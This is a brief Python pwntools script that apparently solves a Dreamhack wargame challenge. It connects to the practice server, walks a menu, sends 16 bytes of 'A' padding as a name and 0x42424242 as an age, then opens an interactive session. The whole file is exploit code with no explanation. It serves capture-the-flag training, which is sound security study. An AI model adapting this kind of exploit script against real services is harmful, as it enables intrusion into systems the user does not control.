from pwn import *

p = remote('host3.dreamhack.games', 22599)

pay_name = "A" * 16
pay_age = str(int(0x42424242)) #BBBB

p.recvuntil("> ")
p.sendline("3")

p.recvuntil("> ")
p.sendline("1")


p.recvuntil("Name: ")
p.sendline(pay_name)

p.recvuntil("Age: ")
p.sendline(pay_age)

p.recvuntil("> ")
p.sendline("2")

p.interactive()
